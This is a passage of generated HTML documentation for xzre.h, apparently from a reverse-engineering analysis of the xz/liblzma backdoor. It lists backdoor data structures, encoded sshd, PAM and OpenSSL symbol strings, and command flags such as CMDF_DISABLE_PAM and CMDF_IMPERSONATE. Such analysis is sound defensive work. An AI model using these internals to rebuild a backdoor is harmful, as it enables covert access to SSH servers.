<tr class="memitem:af0352a4d23a7e16b20f79506c137e2e1"><td class="memItemLeft" align="right" valign="top"><a id="af0352a4d23a7e16b20f79506c137e2e1"></a>
typedef struct <a class="el" href="structmain__elf.html">main_elf</a>&#160;</td><td class="memItemRight" valign="bottom"><b>main_elf_t</b></td></tr>
<tr class="separator:af0352a4d23a7e16b20f79506c137e2e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a78a513f8570845832aaf68c928a5126a"><td class="memItemLeft" align="right" valign="top"><a id="a78a513f8570845832aaf68c928a5126a"></a>
typedef struct <a class="el" href="structbackdoor__data.html">backdoor_data</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a></td></tr>
<tr class="memdesc:a78a513f8570845832aaf68c928a5126a"><td class="mdescLeft">&#160;</td><td class="mdescRight">this structure is used to hold most of the backdoor information. it's used as a local variable in function <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> <br /></td></tr>
<tr class="separator:a78a513f8570845832aaf68c928a5126a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="memItemLeft" align="right" valign="top"><a id="a98d97fcc51fcd4fdbc88e9cd1f0d4405"></a>
typedef struct <a class="el" href="structbackdoor__data__handle.html">backdoor_data_handle</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a></td></tr>
<tr class="memdesc:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="mdescLeft">&#160;</td><td class="mdescRight">data passed to functions that access the backdoor data <br /></td></tr>
<tr class="separator:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a130c3466679311acb5163d49a2ea048b"><td class="memItemLeft" align="right" valign="top"><a id="a130c3466679311acb5163d49a2ea048b"></a>
typedef struct <a class="el" href="structstring__item.html">string_item</a>&#160;</td><td class="memItemRight" valign="bottom"><b>string_item_t</b></td></tr>
<tr class="separator:a130c3466679311acb5163d49a2ea048b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25049b8d6b9ec64043d555466a1ba0c8"><td class="memItemLeft" align="right" valign="top"><a id="a25049b8d6b9ec64043d555466a1ba0c8"></a>
typedef struct <a class="el" href="structstring__references.html">string_references</a>&#160;</td><td class="memItemRight" valign="bottom"><b>string_references_t</b></td></tr>
<tr class="separator:a25049b8d6b9ec64043d555466a1ba0c8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac09fbbea7d8206283c4c0eae09beec95"><td class="memItemLeft" align="right" valign="top"><a id="ac09fbbea7d8206283c4c0eae09beec95"></a>
typedef struct <a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_shared_libraries_data_t</b></td></tr>
<tr class="separator:ac09fbbea7d8206283c4c0eae09beec95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41b1410a6c3d2613895ce26896903600"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">key_payload_hdr_t</a></td></tr>
<tr class="memdesc:a41b1410a6c3d2613895ce26896903600"><td class="mdescLeft">&#160;</td><td class="mdescRight">the payload header. also used as Chacha IV  <a href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">More...</a><br /></td></tr>
<tr class="separator:a41b1410a6c3d2613895ce26896903600"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa67ed5b791086acc0829e228ff50d9d8"><td class="memItemLeft" align="right" valign="top"><a id="aa67ed5b791086acc0829e228ff50d9d8"></a>
typedef struct <a class="el" href="structkey__payload__body.html">key_payload_body</a>&#160;</td><td class="memItemRight" valign="bottom"><b>key_payload_body_t</b></td></tr>
<tr class="separator:aa67ed5b791086acc0829e228ff50d9d8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaad9381e8f52552bbb914465c45bdac2"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structkey__payload.html">key_payload</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">key_payload_t</a></td></tr>
<tr class="memdesc:aaad9381e8f52552bbb914465c45bdac2"><td class="mdescLeft">&#160;</td><td class="mdescRight">the contents of the RSA 'n' field  <a href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">More...</a><br /></td></tr>
<tr class="separator:aaad9381e8f52552bbb914465c45bdac2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acaf6872f6ef6b8ee82f23eed7848342f"><td class="memItemLeft" align="right" valign="top"><a id="acaf6872f6ef6b8ee82f23eed7848342f"></a>
typedef struct <a class="el" href="structcmd__arguments.html">cmd_arguments</a>&#160;</td><td class="memItemRight" valign="bottom"><b>cmd_arguments_t</b></td></tr>
<tr class="separator:acaf6872f6ef6b8ee82f23eed7848342f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25dd255ba67cef416ef3ef7adeb479ae"><td class="memItemLeft" align="right" valign="top"><a id="a25dd255ba67cef416ef3ef7adeb479ae"></a>
typedef struct <a class="el" href="structkey__ctx.html">key_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>key_ctx_t</b></td></tr>
<tr class="separator:a25dd255ba67cef416ef3ef7adeb479ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa3a6684a5fb42dd8a40723dbfde905c7"><td class="memItemLeft" align="right" valign="top"><a id="aa3a6684a5fb42dd8a40723dbfde905c7"></a>
typedef struct <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_cpuid_reloc_consts_t</b></td></tr>
<tr class="separator:aa3a6684a5fb42dd8a40723dbfde905c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a216c3961f10b457c305611c618495ae1"><td class="memItemLeft" align="right" valign="top"><a id="a216c3961f10b457c305611c618495ae1"></a>
typedef struct <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_tls_get_addr_reloc_consts_t</b></td></tr>
<tr class="separator:a216c3961f10b457c305611c618495ae1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5219a4fe1340ccc6da977feea7154e58"><td class="memItemLeft" align="right" valign="top"><a id="a5219a4fe1340ccc6da977feea7154e58"></a>
typedef struct <a class="el" href="structelf__functions.html">elf_functions</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_functions_t</b></td></tr>
<tr class="separator:a5219a4fe1340ccc6da977feea7154e58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab650ac6c7c050d5b9430dd68b4f4fef8"><td class="memItemLeft" align="right" valign="top"><a id="ab650ac6c7c050d5b9430dd68b4f4fef8"></a>
typedef struct <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a>&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma_allocator_t</b></td></tr>
<tr class="separator:ab650ac6c7c050d5b9430dd68b4f4fef8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aab16a9d096477545284f14539e84c7bc"><td class="memItemLeft" align="right" valign="top"><a id="aab16a9d096477545284f14539e84c7bc"></a>
typedef struct <a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>instruction_search_ctx_t</b></td></tr>
<tr class="separator:aab16a9d096477545284f14539e84c7bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="enum-members"></a>
Enumerations</h2></td></tr>
<tr class="memitem:a7a28d9f889f70e46106eb6e946183605"><td class="memItemLeft" align="right" valign="top"><a id="a7a28d9f889f70e46106eb6e946183605"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>InstructionFlags</b> { <br />
&#160;&#160;<b>DF_LOCK</b> = 1
, <b>DF_ESEG</b> = 2
, <b>DF_OSIZE</b> = 4
, <b>DF_ASIZE</b> = 8
, <br />
&#160;&#160;<b>DF_REX</b> = 0x20
<br />
 }</td></tr>
<tr class="separator:a7a28d9f889f70e46106eb6e946183605"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8720669b781fc318e97d4ec37ae4997c"><td class="memItemLeft" align="right" valign="top"><a id="a8720669b781fc318e97d4ec37ae4997c"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>ElfFlags</b> { <br />
&#160;&#160;<b>X_ELF_PLTREL</b> = 0x1
, <b>X_ELF_RELA</b> = 0x2
, <b>X_ELF_RELR</b> = 0x4
, <b>X_ELF_VERSYM</b> = 0x10
, <br />
&#160;&#160;<b>X_ELF_NOW</b> = 0x20
<br />
 }</td></tr>
<tr class="separator:a8720669b781fc318e97d4ec37ae4997c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a312257dd76472b76f479e15d180c4570"><td class="memItemLeft" align="right" valign="top"><a id="a312257dd76472b76f479e15d180c4570"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>ModRm_Mod</b> { <b>MRM_I_REG</b>
, <b>MRM_I_DISP1</b>
, <b>MRM_I_DISP4</b>
, <b>MRM_D_REG</b>
 }</td></tr>
<tr class="separator:a312257dd76472b76f479e15d180c4570"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af4d7fb9dcfda9656ed2c6aeaec3357be"><td class="memItemLeft" align="right" valign="top"><a id="af4d7fb9dcfda9656ed2c6aeaec3357be"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>FuncFindType</b> { <b>FIND_ENDBR64</b>
, <b>FIND_NOP</b>
 }</td></tr>
<tr class="separator:af4d7fb9dcfda9656ed2c6aeaec3357be"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3ed7f6d009d35ae3bdb830a7bb1e0289"><td class="memItemLeft" align="right" valign="top"><a id="a3ed7f6d009d35ae3bdb830a7bb1e0289"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>ElfId</b> { <b>X_ELF_MAIN</b> = 0
, <b>X_ELF_TMP</b> = 1
, <b>X_ELF_LIBC</b> = 2
, <b>X_ELF_LIBCRYPTO</b> = 3
 }</td></tr>
<tr class="separator:a3ed7f6d009d35ae3bdb830a7bb1e0289"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a28fea6434bc30b26e47118825e2732fb"><td class="memItemLeft" align="right" valign="top"><a id="a28fea6434bc30b26e47118825e2732fb"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>StringXrefId</b> { <br />
&#160;&#160;<b>XREF_xcalloc_zero_size</b> = 0
, <b>XREF_Could_not_chdir_to_home_directory_s_s</b> = 1
, <b>XREF_list_hostkey_types</b> = 2
, <b>XREF_demote_sensitive_data</b> = 3
, <br />
&#160;&#160;<b>XREF_mm_terminate</b> = 4
, <b>XREF_mm_pty_allocate</b> = 5
, <b>XREF_mm_do_pam_account</b> = 6
, <b>XREF_mm_session_pty_cleanup2</b> = 7
, <br />
&#160;&#160;<b>XREF_mm_getpwnamallow</b> = 8
, <b>XREF_mm_sshpam_init_ctx</b> = 9
, <b>XREF_mm_sshpam_query</b> = 10
, <b>XREF_mm_sshpam_respond</b> = 11
, <br />
&#160;&#160;<b>XREF_mm_sshpam_free_ctx</b> = 12
, <b>XREF_mm_choose_dh</b> = 13
, <b>XREF_sshpam_respond</b> = 14
, <b>XREF_sshpam_auth_passwd</b> = 15
, <br />
&#160;&#160;<b>XREF_sshpam_query</b> = 16
, <b>XREF_start_pam</b> = 17
, <b>XREF_mm_request_send</b> = 18
, <b>XREF_mm_log_handler</b> = 19
, <br />
&#160;&#160;<b>XREF_Could_not_get_agent_socket</b> = 20
, <b>XREF_auth_root_allowed</b> = 21
, <b>XREF_mm_answer_authpassword</b> = 22
, <b>XREF_mm_answer_keyallowed</b> = 23
, <br />
&#160;&#160;<b>XREF_mm_answer_keyverify</b> = 24
, <b>XREF_48s_48s_d_pid_ld_</b> = 25
, <b>XREF_Unrecognized_internal_syslog_level_code_d</b> = 26
<br />
 }</td></tr>
<tr class="separator:a28fea6434bc30b26e47118825e2732fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afde1d1c69b6bedd0626eee956c7111de"><td class="memItemLeft" align="right" valign="top"><a id="afde1d1c69b6bedd0626eee956c7111de"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>EncodedStringId</b> { <br />
&#160;&#160;<b>STR_from</b> = 0x810
, <b>STR_ssh2</b> = 0x678
, <b>STR_48s_48s_d_pid_ld_</b> = 0xd8
, <b>STR_s</b> = 0x708
, <br />
&#160;&#160;<b>STR_usr_sbin_sshd</b> = 0x108
, <b>STR_Accepted_password_for</b> = 0x870
, <b>STR_Accepted_publickey_for</b> = 0x1a0
, <b>STR_BN_bin2bn</b> = 0xc40
, <br />
&#160;&#160;<b>STR_BN_bn2bin</b> = 0x6d0
, <b>STR_BN_dup</b> = 0x958
, <b>STR_BN_free</b> = 0x418
, <b>STR_BN_num_bits</b> = 0x4e0
, <br />
&#160;&#160;<b>STR_Connection_closed_by</b> = 0x790
, <b>STR_Could_not_chdir_to_home_directory_s_s</b> = 0x18
, <b>STR_Could_not_get_agent_socket</b> = 0xb0
, <b>STR_DISPLAY</b> = 0x960
, <br />
&#160;&#160;<b>STR_DSA_get0_pqg</b> = 0x9d0
, <b>STR_DSA_get0_pub_key</b> = 0x468
, <b>STR_EC_KEY_get0_group</b> = 0x7e8
, <b>STR_EC_KEY_get0_public_key</b> = 0x268
, <br />
&#160;&#160;<b>STR_EC_POINT_point2oct</b> = 0x6e0
, <b>STR_EVP_CIPHER_CTX_free</b> = 0xb28
, <b>STR_EVP_CIPHER_CTX_new</b> = 0x838
, <b>STR_EVP_DecryptFinal_ex</b> = 0x2a8
, <br />
&#160;&#160;<b>STR_EVP_DecryptInit_ex</b> = 0xc08
, <b>STR_EVP_DecryptUpdate</b> = 0x3f0
, <b>STR_EVP_Digest</b> = 0xf8
, <b>STR_EVP_DigestVerify</b> = 0x408
, <br />
&#160;&#160;<b>STR_EVP_DigestVerifyInit</b> = 0x118
, <b>STR_EVP_MD_CTX_free</b> = 0xd10
, <b>STR_EVP_MD_CTX_new</b> = 0xaf8
, <b>STR_EVP_PKEY_free</b> = 0x6f8
, <br />
&#160;&#160;<b>STR_EVP_PKEY_new_raw_public_key</b> = 0x758
, <b>STR_EVP_PKEY_set1_RSA</b> = 0x510
, <b>STR_EVP_chacha20</b> = 0xc28
, <b>STR_EVP_sha256</b> = 0xc60
, <br />
&#160;&#160;<b>STR_EVP_sm</b> = 0x188
, <b>STR_GLIBC_2_2_5</b> = 0x8c0
, <b>STR_GLRO_dl_naudit_naudit</b> = 0x6a8
, <b>STR_KRB5CCNAME</b> = 0x1e0
, <br />
&#160;&#160;<b>STR_LD_AUDIT</b> = 0xcf0
, <b>STR_LD_BIND_NOT</b> = 0xbc0
, <b>STR_LD_DEBUG</b> = 0xa90
, <b>STR_LD_PROFILE</b> = 0xb98
, <br />
&#160;&#160;<b>STR_LD_USE_LOAD_BIAS</b> = 0x3e0
, <b>STR_LINES</b> = 0xa88
, <b>STR_RSA_free</b> = 0xac0
, <b>STR_RSA_get0_key</b> = 0x798
, <br />
&#160;&#160;<b>STR_RSA_new</b> = 0x918
, <b>STR_RSA_public_decrypt</b> = 0x1d0
, <b>STR_RSA_set0_key</b> = 0x540
, <b>STR_RSA_sign</b> = 0x8f8
, <br />
&#160;&#160;<b>STR_SSH_2_0</b> = 0x990
, <b>STR_TERM</b> = 0x4a8
, <b>STR_Unrecognized_internal_syslog_level_code_d</b> = 0xe0
, <b>STR_WAYLAND_DISPLAY</b> = 0x158
, <br />
&#160;&#160;<b>STR_errno_location</b> = 0x878
, <b>STR_libc_stack_end</b> = 0x2b0
, <b>STR_libc_start_main</b> = 0x228
, <b>STR_dl_audit_preinit</b> = 0xa60
, <br />
&#160;&#160;<b>STR_dl_audit_symbind_alt</b> = 0x9c8
, <b>STR_exit</b> = 0x8a8
, <b>STR_r_debug</b> = 0x5b0
, <b>STR_rtld_global</b> = 0x5b8
, <br />
&#160;&#160;<b>STR_rtld_global_ro</b> = 0xa98
, <b>STR_auth_root_allowed</b> = 0xb8
, <b>STR_authenticating</b> = 0x1d8
, <b>STR_demote_sensitive_data</b> = 0x28
, <br />
&#160;&#160;<b>STR_getuid</b> = 0x348
, <b>STR_ld_linux_x86_64_so</b> = 0xa48
, <b>STR_libc_so</b> = 0x7d0
, <b>STR_libcrypto_so</b> = 0x7c0
, <br />
&#160;&#160;<b>STR_liblzma_so</b> = 0x590
, <b>STR_libsystemd_so</b> = 0x938
, <b>STR_list_hostkey_types</b> = 0x20
, <b>STR_malloc_usable_size</b> = 0x440
, <br />
&#160;&#160;<b>STR_mm_answer_authpassword</b> = 0xc0
, <b>STR_mm_answer_keyallowed</b> = 0xc8
, <b>STR_mm_answer_keyverify</b> = 0xd0
, <b>STR_mm_answer_pam_start</b> = 0x948
, <br />
&#160;&#160;<b>STR_mm_choose_dh</b> = 0x78
, <b>STR_mm_do_pam_account</b> = 0x40
, <b>STR_mm_getpwnamallow</b> = 0x50
, <b>STR_mm_log_handler</b> = 0xa8
, <br />
&#160;&#160;<b>STR_mm_pty_allocate</b> = 0x38
, <b>STR_mm_request_send</b> = 0xa0
, <b>STR_mm_session_pty_cleanup2</b> = 0x48
, <b>STR_mm_sshpam_free_ctx</b> = 0x70
, <br />
&#160;&#160;<b>STR_mm_sshpam_init_ctx</b> = 0x58
, <b>STR_mm_sshpam_query</b> = 0x60
, <b>STR_mm_sshpam_respond</b> = 0x68
, <b>STR_mm_terminate</b> = 0x30
, <br />
&#160;&#160;<b>STR_parse_PAM</b> = 0xc58
, <b>STR_password</b> = 0x400
, <b>STR_preauth</b> = 0x4f0
, <b>STR_pselect</b> = 0x690
, <br />
&#160;&#160;<b>STR_publickey</b> = 0x7b8
, <b>STR_read</b> = 0x308
, <b>STR_rsa_sha2_256</b> = 0x710
, <b>STR_setlogmask</b> = 0x428
, <br />
&#160;&#160;<b>STR_setresgid</b> = 0x5f0
, <b>STR_setresuid</b> = 0xab8
, <b>STR_shutdown</b> = 0x760
, <b>STR_ssh_2_0</b> = 0xd08
, <br />
&#160;&#160;<b>STR_ssh_rsa_cert_v01_openssh_com</b> = 0x2c8
, <b>STR_sshpam_auth_passwd</b> = 0x88
, <b>STR_sshpam_query</b> = 0x90
, <b>STR_sshpam_respond</b> = 0x80
, <br />
&#160;&#160;<b>STR_start_pam</b> = 0x98
, <b>STR_system</b> = 0x9f8
, <b>STR_unknown</b> = 0x198
, <b>STR_user</b> = 0xb10
, <br />
&#160;&#160;<b>STR_write</b> = 0x380
, <b>STR_xcalloc_zero_size</b> = 0x10
, <b>STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj</b> = 0xb00
, <b>STR_ELF</b> = 0x300
<br />
 }</td></tr>
<tr class="separator:afde1d1c69b6bedd0626eee956c7111de"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5f8f63d8ae502ab76547c7b077cb067c"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067c">CommandFlags1</a> { <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067caef08c4a90ed6e0457d25d2c229bd375a">CMDF_8BYTES</a> = 1 &lt;&lt; 0
, <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067ca3616e0158ba9d48631cbdf2f9ff3eb7e">CMDF_SETLOGMASK</a> = 1 &lt;&lt; 2
, <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067cac37705603ed342dbf4c076c037357891">CMDF_DISABLE_PAM</a> = 0x40
 }</td></tr>
<tr class="separator:a5f8f63d8ae502ab76547c7b077cb067c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a408b28a8a0686c2ba0ede1e1b4208348"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348">CommandFlags2</a> { <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348ad62079a782b410d925454cf4c67cad43">CMDF_IMPERSONATE</a> = 0x1
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348a503e908611a2b460cac82b916acf3d68">CMDF_CHANGE_MONITOR_REQ</a> = 0x2
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348ae700a962c8a6f21e7e4f6b1a461e0f71">CMDF_CONTINUATION</a> = 0x40
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348a955fb3640af5b4d2852a6f2b869d9940">CMDF_PSELECT</a> = 0xC0
 }</td></tr>
<tr class="separator:a408b28a8a0686c2ba0ede1e1b4208348"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:a07340e0f8ca9df744bc24ed6a6d2414c"><td class="memItemLeft" align="right" valign="top"><a id="a07340e0f8ca9df744bc24ed6a6d2414c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, symbol_ptr, 0)</td></tr>
<tr class="separator:a07340e0f8ca9df744bc24ed6a6d2414c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4e543602ec7511d624f8f3f7b83a1ee8"><td class="memItemLeft" align="right" valign="top"><a id="a4e543602ec7511d624f8f3f7b83a1ee8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, got_ptr, 8)</td></tr>
<tr class="separator:a4e543602ec7511d624f8f3f7b83a1ee8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a238dfcc13519ae09f6ae9097691f41b9"><td class="memItemLeft" align="right" valign="top"><a id="a238dfcc13519ae09f6ae9097691f41b9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, return_address, 0x10)</td></tr>
<tr class="separator:a238dfcc13519ae09f6ae9097691f41b9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a66d3cb2e332731ec072e1462a85884df"><td class="memItemLeft" align="right" valign="top"><a id="a66d3cb2e332731ec072e1462a85884df"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, cpuid_fn, 0x18)</td></tr>
<tr class="separator:a66d3cb2e332731ec072e1462a85884df"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a12b5b3403c2bfcb1ad17f541f7c58761"><td class="memItemLeft" align="right" valign="top"><a id="a12b5b3403c2bfcb1ad17f541f7c58761"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, got_offset, 0x20)</td></tr>
<tr class="separator:a12b5b3403c2bfcb1ad17f541f7c58761"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace8b543f9a35173e40d83faa3a895e17"><td class="memItemLeft" align="right" valign="top"><a id="ace8b543f9a35173e40d83faa3a895e17"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, frame_address, 0x28)</td></tr>
<tr class="separator:ace8b543f9a35173e40d83faa3a895e17"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab3d792dd4e4c22999ebf91eb5648a1f4"><td class="memItemLeft" align="right" valign="top"><a id="ab3d792dd4e4c22999ebf91eb5648a1f4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, instruction, 0)</td></tr>
<tr class="separator:ab3d792dd4e4c22999ebf91eb5648a1f4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab1eb145f12c67a4be49fbaa6e3099992"><td class="memItemLeft" align="right" valign="top"><a id="ab1eb145f12c67a4be49fbaa6e3099992"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, instruction_size, 8)</td></tr>
<tr class="separator:ab1eb145f12c67a4be49fbaa6e3099992"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a79e1a7055dcef8979c2b23a65ba621bb"><td class="memItemLeft" align="right" valign="top"><a id="a79e1a7055dcef8979c2b23a65ba621bb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, flags, 0x10)</td></tr>
<tr class="separator:a79e1a7055dcef8979c2b23a65ba621bb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8376690511def56513ab02a0fb86b164"><td class="memItemLeft" align="right" valign="top"><a id="a8376690511def56513ab02a0fb86b164"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, flags2, 0x11)</td></tr>
<tr class="separator:a8376690511def56513ab02a0fb86b164"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a712dd0741cd0f1f19762f77f7ee7a6fc"><td class="memItemLeft" align="right" valign="top"><a id="a712dd0741cd0f1f19762f77f7ee7a6fc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, lock_byte, 0x14)</td></tr>
<tr class="separator:a712dd0741cd0f1f19762f77f7ee7a6fc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaa8191a6eeda3f4475fc1e5726a555cd"><td class="memItemLeft" align="right" valign="top"><a id="aaa8191a6eeda3f4475fc1e5726a555cd"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, last_prefix, 0x16)</td></tr>
<tr class="separator:aaa8191a6eeda3f4475fc1e5726a555cd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1e9aff34162fef534b67b1607f2c0393"><td class="memItemLeft" align="right" valign="top"><a id="a1e9aff34162fef534b67b1607f2c0393"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, rex_byte, 0x1B)</td></tr>
<tr class="separator:a1e9aff34162fef534b67b1607f2c0393"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd204ec028d99bfdd5f4442789667f60"><td class="memItemLeft" align="right" valign="top"><a id="acd204ec028d99bfdd5f4442789667f60"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm, 0x1C)</td></tr>
<tr class="separator:acd204ec028d99bfdd5f4442789667f60"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a38fd5334ee76d701cb9ea5ed59edb20a"><td class="memItemLeft" align="right" valign="top"><a id="a38fd5334ee76d701cb9ea5ed59edb20a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_mod, 0x1D)</td></tr>
<tr class="separator:a38fd5334ee76d701cb9ea5ed59edb20a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac6195f64611e4619231a2565746d292a"><td class="memItemLeft" align="right" valign="top"><a id="ac6195f64611e4619231a2565746d292a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_reg, 0x1E)</td></tr>
<tr class="separator:ac6195f64611e4619231a2565746d292a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2834cafae7e8ef36218929187afe78e5"><td class="memItemLeft" align="right" valign="top"><a id="a2834cafae7e8ef36218929187afe78e5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_rm, 0x1F)</td></tr>
<tr class="separator:a2834cafae7e8ef36218929187afe78e5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a92f57bfeaa7959d5aabe4d3de379448a"><td class="memItemLeft" align="right" valign="top"><a id="a92f57bfeaa7959d5aabe4d3de379448a"></a>
